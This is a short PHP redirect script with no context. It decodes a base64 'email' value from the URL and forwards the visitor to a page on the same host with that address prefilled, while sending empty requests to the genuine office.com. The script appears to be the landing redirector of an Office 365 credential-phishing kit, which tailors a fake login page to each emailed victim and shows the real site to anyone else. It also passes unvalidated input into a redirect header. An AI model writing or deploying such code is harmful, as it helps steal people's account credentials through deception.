<?php
$code = base64_decode($_GET['code']);
$link = "https://".$_SERVER['HTTP_HOST']."?email=";
if($code==""){
    header('Location: http://www.office.com/');
}else{
    header("Location: ".$link.$code);
}
?>